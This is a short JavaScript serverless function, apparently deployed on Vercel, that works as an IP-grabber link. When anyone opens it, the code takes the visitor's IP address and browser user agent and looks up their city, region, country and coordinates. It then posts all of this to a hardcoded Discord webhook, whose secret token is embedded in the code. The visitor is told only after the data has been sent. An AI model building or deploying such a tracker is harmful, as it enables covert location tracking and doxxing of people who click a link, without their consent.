// File: api/apapun.js

export default async function handler(req, res) {
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5';
  
  // Ambil IP dari Vercel
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() 
    || req.socket.remoteAddress 
    || 'unknown';
  
  // Ambil USER AGENT ASLI (tanpa parsing)
  const userAgentRaw = req.headers['user-agent'] || 'unknown';
  
  // Ambil info lokasi dari ipwho.is
  let locationInfo = null;
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);
    const response = await fetch(`https://ipwho.is/${ip}`, { signal: controller.signal });
    clearTimeout(timeoutId);
    if (response.ok) locationInfo = await response.json();
  } catch (err) {
    console.error('GeoIP error:', err.message);
  }
  
  // Format pesan Discord
  let discordContent = `**🔔 ADA YANG BUKA LINK!**\n\n` +
    `**🌐 IP:** \`${ip}\`\n` +
    `**📱 User Agent Asli:**\n\`\`\`\n${userAgentRaw}\n\`\`\`\n` +
    `**🕒 Waktu:** ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n`;
  
  if (locationInfo && locationInfo.success) {
    discordContent += `\n**📍 Lokasi:**\n` +
      `🏙️ Kota: ${locationInfo.city || 'Unknown'}\n` +
      `🗺️ Region: ${locationInfo.region || 'Unknown'}\n` +
      `🇮🇩 Negara: ${locationInfo.country || 'Unknown'} ${locationInfo.flag?.emoji || ''}\n` +
      `📌 Koordinat: ${locationInfo.latitude || '?'}, ${locationInfo.longitude || '?'}\n`;
  }
  
  // Kirim ke Discord
  fetch(DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: discordContent })
  }).catch(err => console.error('Discord error:', err.message));
  
  // Response JSON
  res.status(200).json({
    success: true,
    message: 'Info Anda sudah dikirim ke admin',
    your_ip: ip,
    your_user_agent: userAgentRaw,
    timestamp: new Date().toISOString()
  });
        }
